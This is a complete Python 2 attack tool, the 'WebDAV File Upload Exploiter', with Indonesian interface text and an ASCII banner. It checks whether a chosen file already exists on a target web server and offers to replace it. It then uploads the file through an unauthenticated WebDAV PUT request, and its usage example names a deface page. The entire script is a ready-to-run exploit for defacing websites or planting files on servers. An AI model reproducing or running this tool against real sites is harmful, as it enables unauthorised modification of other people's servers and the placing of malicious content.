#!/usr/bin/python

import requests
import string
import random
import time
import sys
import os

os.system("clear")

print ("""
\33[31m  __      __      ___.   ________      _________   ____\33[0m 
\33[31m /  \    /  \ ____\_ |__ \______ \    /  _  \   \ /   /\33[0m 
\33[31m \   \/\/   // __ \| __ \ |    |  \  /  /_\  \   Y   / \33[0m
\33[35m  \        /\  ___/| \_\ \|    `   \/    |    \     /  \33[0m 
\33[35m   \__/\  /  \___  >___  /_______  /\____|__  /\___/   \33[0m 
\33[35m        \/       \/    \/        \/         \/         \33[0m 
              \33[31m Author \33[0m : \33[35m Djunekz\33[0m

\33[32m[\33[33m>\33[32m]\33[0m WebDAV File Upload Exploiter
\33[32m[\33[33m>\33[32m]\33[0m Coded Python By \33[32mD J U N E K Z\33[0m
\33[32m[\33[33m>\33[32m]\33[0m PHP Exploit by \33[32mCyberPEJAYA\33[0m                      """)
def webdav():
  sc = ''
  with open(sys.argv[2], 'rb') as f:
      depes = f.read()
  script = depes
  host = sys.argv[1]
  if not host.startswith('http'):
    host = 'http://' + host
  nama = '/'+sys.argv[2]


  print ("\33[32m[\33[33m!\33[32m]\33[0m Upload Nama File : %s") % (sys.argv[2])

  print ("\33[32m[\33[33m!\33[32m]\33[0m Uploading %d bytes, Script Baru") % len(script)

  r = requests.request('put', host + nama, data=script, headers={'Content-Type':'application/octet-stream'})

  if r.status_code < 200 or r.status_code >= 300:
    print("\33[32m[\33[31m!\33[32m]\33[0m Upload failed . . .")
    sys.exit(1)
  else:
    print("\33[32m[\33[33m!\33[32m]\33[0m File Uploaded . . .")
    print("\33[32m[\33[33m!\33[32m]\33[0m PATH : "+host + nama)


def cekfile():
 print("""
\33[32m[\33[33m>\33[32m]\33[0m Processing . . . .
""")

 print ("\33[32m[\33[33m>\33[32m]\33[0m Target : \33[32m"+sys.argv[1])
 print ("\33[32m[\33[33m>\33[32m]\33[0m Files : \33[32m"+sys.argv[2])

 print("""
\33[32m[\33[33m>\33[32m]\33[0m Updating . . . .
""")

 print ("\33[32m[\33[33m!\33[32m]\33[0m Cek File Di Target : "+sys.argv[1]+"/"+sys.argv[2])
 r = requests.get(sys.argv[1] +"/"+ sys.argv[2])
 if r.status_code == requests.codes.ok:
  print ("\33[32m[\33[0m\33[33m!\33[0m\33[32m]\33[0m Di Temukan File Yg Sama Di Target . . .")
  tanya = raw_input("\33[32m[\33[0m\33[33m?\33[0m\33[32m]\33[0m Replace File Target ? [Y/N] > ")
  if tanya == "Y":
   webdav()
  else:
   print ("\33[32m[\33[0m\33[31m!\33[0m\33[32m]\33[0m Exiting Tools . . .")
   print ("\33[32m[\33[0m\33[31m!\33[0m\33[32m]\33[0m Proses Upload Gagal . . .")
   sys.exit()
 else:
   print ("\33[32m[\33[0m\33[33m!\33[0m\33[32m]\33[0m Nama File Serupa Tidak Ada Di Target . . .")
   print ("\33[32m[\33[0m\33[33m!\33[0m\33[32m]\33[0m Proses Upload Script . . .")
   webdav()


if __name__ == '__main__':
  if len(sys.argv) != 3:
    print("\n\33[32m[\33[33mWARNING!\33[32m]\33[0m \33[31m Perintah\33[0m\33[33m :\33[0m python2 " +sys.argv[0]+ " <target> <script>\n")
    print("\n\33[32m[\33[33mWARNING!\33[32m]\33[0m \33[31m Contoh\33[0m\33[33m :\33[0m python2 " +sys.argv[0]+ " http://Target.com ScriptDeface.html\n")
    sys.exit(0)
  else:
    cekfile()
